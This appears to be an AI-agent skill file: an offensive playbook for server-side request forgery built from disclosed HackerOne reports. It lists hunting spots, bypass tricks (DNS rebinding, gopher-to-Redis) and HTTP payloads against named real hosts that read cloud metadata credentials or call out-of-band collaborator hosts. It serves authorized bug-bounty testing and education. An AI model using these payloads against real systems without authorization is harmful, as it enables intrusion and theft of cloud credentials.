---
name: ssrf
description: "Server-Side Request Forgery (SSRF) offensive playbook from 149 disclosed HackerOne reports (28 critical, 39 high, 52 medium, 30 low). Use when hunting or reviewing server-side request forgery (ssrf). Triggers: ssrf, server, allowed, internal, blind."
license: "For authorized security testing and education only."
---

# Server-Side Request Forgery (SSRF)

> Distilled from **149** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

The server fetches an attacker-influenced URL, letting you reach internal services, cloud metadata, or exfiltrate data. Includes blind SSRF and DNS-rebinding variants.

## Where to hunt

- Find URL-consuming features: webhooks, link previews, image/PDF fetchers, import-from-URL, SSO metadata, PDF/HTML renderers, avatar-by-URL.
- Use a collaborator/OAST host to detect blind fetches; watch for callbacks and DNS lookups.

## Exploitation playbook

- Point at cloud metadata (`169.254.169.254`, GCP/Azure IMDS) to steal instance credentials.
- Reach internal admin panels, databases, `localhost` services, and link-local ranges.
- Blind SSRF → internal port scan via timing/response differences; exfil via DNS.

## Bypass techniques

- Alternate IP encodings (decimal, octal, hex, IPv6-mapped), `[::]`, `0.0.0.0`, enclosed-alphanumerics.
- Redirect chains (302 to internal), DNS rebinding (TOCTOU between check and fetch), `@`/userinfo tricks, uppercase/percent-encoding.
- Protocol smuggling: `file://`, `gopher://` (to talk to Redis/SMTP), `dict://`.

## Impact & escalation

- Cloud creds → account takeover of the whole environment; gopher→Redis→RCE; internal API access.

## Remediation

- Allowlist destinations, resolve+pin DNS and re-validate after resolution, block link-local/metadata ranges, disable unused URL schemes, drop redirects.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1086206](https://hackerone.com/reports/1086206)  -  Blind SSRF vulnerability on cz.acronis.com
*medium*

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: cz.acronis.com
Referer: https://cz.acronis.com/kosik/?item=7200
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 582
Cookie: _ga=GA1.2.1144740602.1610556882; _fbp=fb.1.1610556883161.353705208; leady_session_id=8dd6174…

items%5B0%5D%5Bname%5D=Acronis+Disk+Director+12.5+Home+1+PC&items%5B0%5D%5Bprice%5D=1056&items%5B0%5D%5BformattedPrice%5D=1056.00k%C4%8D&totalSurcharge=1056&addItem=undefined&removeItem=undefined&recalculate=undefined&name=Jmone&isCompany=YES&notifier_x-iscompany=NO&undefined=false&deliveryClearKatakana=true&company=&surname=Pifsf&deliveryClearRomanized=true&address=http%3a%2f%2fjczo3ewu8jpfgyiajmkacspsnjtbh0.burpcollaborator.net/ssrf&zip=25458&city=sdfasd&ico=&dic=&email=test%40fgmail.com&phone=%2B420+724+023+780&newsletter=false&notifier_x-newsletter=NO&action=createPayment
```

### 2. [#793704](https://hackerone.com/reports/793704)  -  Server-Side Request Forgery (SSRF) in Ghost CMS
*medium*

```http
GET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json&type=embed HTTP/1.1
Host: YOUR_WEBSITE
X-Requested-With: XMLHttpRequest
Content-Type: application/json; charset=UTF-8
Cookie: ghost-admin-api-session=YOUR_SESSION
```

### 3. [#781295](https://hackerone.com/reports/781295)  -  [h1-415 2020] SSRF in a headless chrome with remote debugging leads…
*critical*

```http
POST /support/review/efe74fb38a69eae74f733a3e035edf33ed14f34af0755495ff6abae219155587 HTTP/1.1
Host: h1-415.h1ctf.com
Referer: https://h1-415.h1ctf.com/support/review/88cdddff2719525210a5cdc95f3cf7f14c83f6e44caf87f5ec4255a9f69e35eb
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Origin: https://h1-415.h1ctf.com
Cookie: _csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee; session=eyJfY3NyZl90b2tlbiI6IjQ2Y2I4YT…
```

### 4. [#1241149](https://hackerone.com/reports/1241149)  -  FULL SSRF
*low*

```http
GET /login/wl?bzIframeUrl=http%3a%2f%2f169%2e254%2e169%2e254%2flatest%2fmeta-data%2f&eventGroup=31048&eventId=228513&encryptedOrigin=1%3APXwmTfsOX5swR5WLWW1hEcWFR24vg2RCT1aflJJNM%2BchgNaRQ2fSRv7QJX3Ro27uTjR%2BUzV0z1s3siiObx%2BOHQ%3D%3D&screen=PROFILE_FULL&closable=false&emailLoginRedirectUrl=https%3A%2F%2Fsummit.acronis.events%2Fsettings%2Fprofile&colorMain=%2362a4f7&showChangeEmail=true&showTitle=false&encryptedTokens=1%3AIqgWUC4KnRXhJjI%2Bh4Hr1qbBFa%2FF3CT1SYs5Uv0s6S6ujzX%2FeGjQpYoJiqxy4un688xsXJXHC0CefbCMT724MnJxY%2BPoWfg3UO%2FHX49FTANq%2Fe9cyA%2BXlhLeAn7gWIAyZzg4RNnSwO0OEi%2FcFx5ozg%3D%3D&enableTicketIdLogin=true&enableFullStory=true&restrictLoginWithoutRegistration=true&IBMBannedCountries=false HTTP/1.1
Host: summit.acronis.events
Cookie: x-bz-refresh-attendee-token=1f20fffa-1d8c-4506-9cb1-a5a45f211f98; _sp_id.880c=7fe0ad97-2770-…
```

### 5. [#2300358](https://hackerone.com/reports/2300358)  -  SSRF in https://couriers.indrive.com/api/file-storage
*high*

```http
GET /api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com HTTP/2
Host: couriers.indrive.com
```

### 6. [#793704](https://hackerone.com/reports/793704)  -  Server-Side Request Forgery (SSRF) in Ghost CMS
*medium*

```http
GET /ghost/api/v3/admin/oembed/?url=http://169.254.169.254/metadata/v1.json&type=embed
```

More payloads: see [payloads.md](payloads.md) (201 curated).

## Recurring patterns in this dataset

Most frequent terms across the 149 reports (term (count)): `ssrf` (167), `server` (48), `allowed` (48), `internal` (42), `blind` (34), `request` (32), `forgery` (29), `attacker` (28), `discovered` (26), `access` (21), `found` (20), `url` (20), `requests` (20), `endpoint` (19), `server-side` (19), `parameter` (17), `network` (16), `potentially` (16)

## Worked example  -  [report #2262382](https://hackerone.com/reports/2262382)

*Server Side Request Forgery (SSRF) via Analytics Reports* (critical, $25,000)

> Hello Gents, I would like to report an issue where attackers are able to read internal files via an SSRF vulnerability. Proof of concept + ███ Impact SSRF. Thanks and have a nice day!…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#2262382](https://hackerone.com/reports/2262382) | critical | $25,000 | security | Server Side Request Forgery (SSRF) via Analytics Reports |
| [#1409727](https://hackerone.com/reports/1409727) | critical | $5,000 | lark_technologies | Full read SSRF via Lark Docs `import as docs` feature |
| [#892049](https://hackerone.com/reports/892049) | critical | $3,000 | lark_technologies | Stored XSS & SSRF in Lark Docs |
| [#643278](https://hackerone.com/reports/643278) | critical | $1,500 | dynatrace | SSRF in the Custom Integration Webhook discloses AWS metadata |
| [#1719719](https://hackerone.com/reports/1719719) | critical | $1,000 | acronis | mail.acronis.com is vulnerable to zero day vulnerability CVE-2022-41040 |
| [#549882](https://hackerone.com/reports/549882) | critical |  -  | vimeo | SSRF  leaking internal google cloud data through upload function [SSH Keys, etc..] |
| [#1189367](https://hackerone.com/reports/1189367) | critical |  -  | evernote | Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion |
| [#878779](https://hackerone.com/reports/878779) | critical |  -  | gitlab | Full Read SSRF on Gitlab's Internal Grafana |

*See [reference.md](reference.md) for all 149 reports in this class.*
